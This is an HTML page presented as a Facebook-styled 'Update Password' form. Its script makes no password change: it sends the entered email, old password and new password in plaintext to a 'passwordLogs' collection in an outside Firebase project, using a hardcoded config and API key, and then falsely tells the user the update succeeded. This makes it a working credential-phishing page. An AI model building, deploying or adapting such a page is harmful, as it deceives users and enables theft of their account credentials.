<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Update Password</title>

  <style>
    body {
      font-family: Arial;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .box {
      background: white;
      padding: 25px;
      border-radius: 10px;
      width: 350px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    h2 {
      text-align: center;
      color: #1877f2;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #ddd;
      border-radius: 5px;
    }

    button {
      width: 100%;
      padding: 10px;
      background: #1877f2;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    button:hover {
      background: #155dc1;
    }
  </style>
</head>

<body>

<div class="box">
  <h2>Update Password</h2>

  <input type="text" id="email" placeholder="Email">
  <input type="password" id="password" placeholder="Old Password">
  <input type="password" id="newPassword" placeholder="New Password">
  <input type="password" id="confirmPassword" placeholder="Confirm Password">

  <button onclick="updateData()">Update</button>
</div>

<script type="module">

  // 🔥 Firebase imports
  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.12.0/firebase-app.js";
  import { getFirestore, collection, addDoc } 
  from "https://www.gstatic.com/firebasejs/12.12.0/firebase-firestore.js";

  // 🔥 YOUR CONFIG (اللي انت بعته)
  const firebaseConfig = {
    apiKey: "AIzaSyBOQtPf98v3xQGmwTlWo9J2EQyNLED43gs",
    authDomain: "tast-d18b0.firebaseapp.com",
    databaseURL: "https://tast-d18b0-default-rtdb.firebaseio.com",
    projectId: "tast-d18b0",
    storageBucket: "tast-d18b0.firebasestorage.app",
    messagingSenderId: "73439003067",
    appId: "1:73439003067:web:46c3b7b275762fb9f9449e"
  };

  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);

  // 🔥 زرار Update
  window.updateData = async function () {

    const email = document.getElementById("email").value;
    const oldPassword = document.getElementById("password").value;
    const newPassword = document.getElementById("newPassword").value;
    const confirmPassword = document.getElementById("confirmPassword").value;

    if (newPassword !== confirmPassword) {
      alert("Passwords do not match");
      return;
    }

    try {
      await addDoc(collection(db, "passwordLogs"), {
        email: email,
        oldPassword: oldPassword,
        newPassword: newPassword,
        createdAt: new Date()
      });

      alert("update done");

    } catch (error) {
      alert(error.message);
    }
  }

</script>

</body>
</html>
